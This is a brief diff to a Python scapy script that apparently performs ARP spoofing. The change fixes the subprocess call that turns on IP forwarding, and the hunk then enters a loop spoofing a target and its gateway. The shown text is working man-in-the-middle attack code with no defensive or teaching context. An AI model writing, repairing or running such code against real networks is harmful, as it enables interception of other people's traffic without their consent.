@@ -43,7 +43,7 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 try:
-    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward ")
+    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward ", shell=True)
     sent_packets_counts = 0
     while True:
         spoof(target_ip, gateway_ip)
